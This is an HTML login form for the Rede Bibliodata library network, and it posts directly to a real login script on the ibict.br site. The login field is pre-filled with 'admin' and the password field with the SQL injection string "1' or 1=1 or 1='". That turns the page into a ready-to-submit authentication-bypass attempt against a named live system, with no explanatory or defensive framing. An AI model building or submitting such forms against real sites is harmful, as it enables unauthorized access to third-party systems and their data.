<form method="post" action="http://bibliodata.ibict.br/site2/login/prc_login2.asp" target="_new"><p align="center">
<font color="#008CA8" size="+2" face="Verdana"><strong>Rede Bibliodata </strong></font>
<br><br>

	<table width="249" border="0" cellspacing="0" cellpadding="1" align="center" bgcolor="#008CA8">
	  <tr> 
	    <td> 
	      <table width="100%" border="0" cellspacing="0" cellpadding="3" bgcolor="#E8F4F8">
	        <tr bgcolor="#008CA8"> 
	          <td class="linkMenu" colspan="2">Identifica&ccedil;&atilde;o </td>
	        </tr>
	        <tr> 
			  <td class="textoTabelas" colspan="2" align="center">Erro na autenticação! Verifique o login e a senha informados!</td>
			</tr>
			<tr>
	          <td class="tituloTabelas" width="23%"> 
	            <p align="center">Login:</p>
	          </td>
	          <td width="77%"> 
	            <input type="text" size="20" name="sLogin" class="textoTabelas" value="admin">
	          </td>
	        </tr>
	        <tr> 
	          <td class="tituloTabelas" width="23%"> 
	            <div align="center">Senha: </div>
	          </td>
	          <td width="77%"> 
	            <INPUT TYPE="password" size="20" NAME="sSenha" class="textoTabelas"  value="1' or 1=1 or 1='">
	          </td>
	        </tr>
	        <tr> 
	          <td colspan="2"> 
               <div class="textoInterno" id="spandestino">
	            <table width="91%" border="0" cellspacing="0" cellpadding="0" align="center">
	              <tr> 
	                <td width="42%" class="tituloTabelas"> 
	                  <input type="radio" name="false_destino" value="0" checked onClick="destino.value = this.value">
	                  Servi&ccedil;os </td>
	                <td width="58%" class="tituloTabelas"> 
	                  <input type="radio" name="false_destino" value="67" onClick="destino.value = this.value">
	                  Consulta Online</td>
	              </tr>
	            </table>
			   </div>	                      
	          </td>
	        </tr>
	        <tr> 
	          <td colspan="2"> 
	            <div align="center">
					<input type="image" src="img/btn_ok.gif" name="submit" >
	            </div>
	          </td>
	        </tr>
	      </table>
	    </td>
	  </tr>
	</table>
	<input type="hidden" name="destino" value="0">
	<input type="hidden" name="novo" value="0">
</form>

